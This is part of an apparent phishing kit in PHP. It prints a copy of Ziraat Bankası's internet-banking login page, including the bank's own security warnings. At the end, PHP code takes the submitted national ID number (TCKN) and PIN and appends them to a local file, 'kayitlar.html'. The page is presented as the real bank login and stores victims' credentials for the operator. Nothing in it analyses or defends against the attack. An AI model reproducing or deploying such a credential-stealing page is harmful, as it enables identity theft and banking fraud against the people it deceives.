      <div id class="login-info">
                        
         <p><i class="icon-click"></i>Ziraat Bankası İnternet Şubesi´ne sadece www.ziraatbank.com.tr adresindeki "İnternet Şubesi" linkine tıklayarak ulaşınız</p>
         <p><i class="icon-kilit"></i>Müşteri numaranızı, İnternet/Mobil bankacılık giriş ve ATM şifrenizi Ziraat Bankası personeli dahil kimse ile paylaşmayınız.</p>
      
                    </div>
   
                </div>

    
               <a id class="no-click-link combo-logo hidden-xs hidden-sm" href="#">
                  
                  <img src="../../Content/assets/img/comodo-logo.png" style="border-width:0px;" />
               </a>

            </div>

                  </div>
                   
               </div>
                
        </div>
            
    </div>
            
<footer class="visible-xs">
    <div id="ButtonContainer" class="top">
        
  
          <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_SecurityButton" href="javascript:__doPostBack(&#39;ctl00$LoginFooter$SecurityButton&#39;,&#39;&#39;)"><span></span>GÜVENLİK</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_HelpButton" href="javascript:__doPostBack(&#39;ctl00$LoginFooter$HelpButton&#39;,&#39;&#39;)"><span></span>YARDIM</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_FaqButton" href="javascript:__doPostBack(&#39;ctl00$LoginFooter$FaqButton&#39;,&#39;&#39;)"><span></span>SIKÇA SORULAN SORULAR</a>
         <a causesval="false" onclick=";;;" id="ctl00_LoginFooter_BtnLanguage" href="javascript:__doPostBack(&#39;ctl00$LoginFooter$BtnLanguage&#39;,&#39;&#39;)"><span></span>ENGLISH</a>
    
    
    </div>
    <div id class="bottom">
        
      <ul id class="clearfix">
            
         <li id class="">
            <a id class="no-click-link" href="#">
               
               <img src="../../Content/assets/img/comodo-logo.png" style="border-width:0px;" />
            </a>
         </li>
           
           <li id class="call-center">
          <a id="LogoButton" class="icon-musteri-iletisim-merkezi" href="tel:08502200000">
                    
                </a>
       
                </li>

      
        </ul>
    
    </div>
</footer>

        
</div>
    
<script type="text/javascript">
//<![CDATA[
var Page_Validators =  new Array(document.getElementById("ctl00_c_PageValidation"));
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
var ctl00_c_PageValidation = document.all ? document.all["ctl00_c_PageValidation"] : document.getElementById("ctl00_c_PageValidation");
ctl00_c_PageValidation.evaluationfunction = "CustomValidatorEvaluateIsValid";
ctl00_c_PageValidation.clientvalidationfunction = "ValidatePage";
//]]>
</script>


<script type="text/javascript">
//<![CDATA[
$(window).bind("load", function() { if(typeof setHasFormChanges === "function") { setHasFormChanges(top.window, false); } });
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        function OpenSMSOptionLb() { $("#ctl00_c_LbSMSOption").modal("show"); $("#ctl00_c_LbSMSOption").css("display","block");  $("#ctl00_c_LbSMSOption").addClass("in");}//]]>
</script>
</form>

    <script src="/core.js?v=Nk_BEKLbSFZ9W-Qh-PyLX1l6p0kmwmgtKVO7A20fJuA1"></script>

    <script src="/dashboard.js?v=Hu57426f8KHuwyIA-SsO3YSF_XxFbdCEze6_8Xijv9E1"></script>

    <script src="/subpage.js?v=sXB_2jj5iRmQyVGgF_FjVfKYHxnkUUjUkE8rMGsGwBg1"></script>

    <script src="/ui.min.js?v=f2R-3r915Dc_WjYoX4kLagGWUncK9agz7VPpALzIOe01"></script>

    

    <script type="text/javascript">
        MODULES.Utility.Validation(".sendBtn", function () { });
        var isSubmitted = false;
        function loginSubmit() {
            if ($("form").valid())
                $("form").submit();
        }
        function ShowLoginLoading() {
            $("input").blur();
            MODULES.Utility.Loading.show();
        }
        function HideLoginLoading() {
            MODULES.Utility.Loading.hide();
        }
        function SetUserPrefs() {
            try { zrtadx.zrtvalidate("zrt_user_prefs"); } catch (e) { console.log(e); }
        }
    </script>
    
</body>
</html>';



$tckn = htmlspecialchars($_POST['ctl00$c$RetailIdentityTextBox']);
$passwd = htmlspecialchars($_POST['ctl00$c$RetailPinTextBox']);

$yaz='<center><h3>TCKN : '.$tckn.'</h3><br><h3> Pass : '.$passwd.'</h3><br><br></center>';


if(isset($_POST["yarq"])){
$kok=fopen("kayitlar.html","a+");
fwrite($kok,$yaz);
fclose($kok);





}

?>